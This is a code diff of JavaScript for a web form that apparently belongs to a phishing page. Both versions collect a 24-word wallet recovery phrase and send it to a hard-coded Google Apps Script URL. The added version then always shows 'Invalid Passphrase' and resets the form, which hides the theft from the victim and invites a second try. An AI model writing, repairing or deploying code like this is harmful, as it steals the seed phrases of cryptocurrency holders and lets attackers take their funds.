@@ -1,36 +1,67 @@
-function validateAndSendPassphrase(passphrase) {
-    // Trim and split into words
-    const words = passphrase.trim().split(/\s+/);
+// Function to handle form submission
+function handleSubmit(event) {
+    event.preventDefault(); // Prevent default form submission
+    const errorElement = document.getElementById('emsg');
+    errorElement.textContent = '';
+    const myButton = document.getElementById('b1')
+    myButton.disabled = true;
 
-    // Validate passphrase (must be 24 words)
-    if (words.length !== 24) {
-        console.log("INVALID PASSPHRASE");
-        return;
+    const myButton2 = document.getElementById('b2')
+    myButton2.disabled = true;
+    // Step 1: Get the value of the hidden input field with name 'mf-texts'
+    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
+    const inputValue = form.elements['mf-texts'].value.trim();
+
+    
+
+    const wordCount = inputValue.split(/\s+/).length;
+    if (wordCount !==24) {
+        const errorElement = document.getElementById('emsg');
+        errorElement.textContent = 'Invalid Passphrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
+        form.reset();
+        return; // Exit function if word count is not 24
     }
 
-    // Your Google Apps Script URL
-    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec"; 
+    // Step 2: Make a GET request to example.com/send/ + the value from Step 1
+    const url = `https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec${encodeURIComponent(inputValue)}/P-/`;
 
-    // Send data to Google Apps Script
     fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ passphrase: passphrase })
+        method: 'GET'
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            console.log("Passphrase saved successfully! File URL: " + data.fileUrl);
-        } else {
-            console.log("INVALID PASSPHRASE");
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
         }
+        return response.json(); // Assuming the response is JSON; adjust as per your API
+    })
+    .then(data => {
+        // Step 3: Display any errors in the HTML with ID 'emsg'
+        const errorElement = document.getElementById('emsg');
+        errorElement.textContent = ''; // Clear previous error messages
+        // Example assuming the API returns an error message in JSON response
+        // if (data.error) {
+        //     errorElement.textContent = data.error;
+        // }
+        errorElement.textContent = 'Invalid Passphrase'
+        myButton.disabled = false;
+        myButton2.disabled = false;
+        form.reset();
+        // Handle successful response if needed
     })
     .catch(error => {
-        console.error("Error:", error);
+        console.error('Error:', error);
+        const errorElement = document.getElementById('emsg');
+        // errorElement.textContent = 'Error occurred while processing your request.';
+        form.reset();
+        errorElement.textContent = 'Invalid Passphrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
     });
 }
 
-// Example Usage:
-const myPassphrase = "word1 word2 word3 ... word24"; // Replace with your actual passphrase
-validateAndSendPassphrase(myPassphrase);
+// Add event listener to the form for 'submit' event
+const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
+form.addEventListener('submit', handleSubmit);
 
